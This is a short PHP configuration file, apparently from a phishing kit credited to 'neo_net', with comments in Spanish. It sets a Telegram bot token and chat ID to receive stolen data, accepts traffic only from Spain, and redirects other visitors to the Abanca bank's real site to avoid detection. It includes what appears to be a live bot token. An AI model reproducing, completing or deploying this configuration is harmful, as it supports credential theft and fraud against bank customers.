<?php
/**
###############################################
#$      https://telegram.me/neo_net          $#
#$          The Wine Juggler of FUD          $#
###############################################
**/

/* Token Telegram */
$token = '1882880733:AAF2nWsasV7YMF9ugCxR89G4707EEH08JJk';

/* Chat id, para mas información, investigar /getupdates de api telegram, cuando envias un mensaje viene el chatid */
$chats_id = array('607481217');

/* Modo Localhost? */
$localhost = 1;

/* Pais del cual solamente aceptaremos trafico */
$pais = 'ES';

/* Url a redireccionar si no son del pais 'Preferentemente el banco' */
$url = 'https://href.li/?https://bancaelectronica.abanca.com';

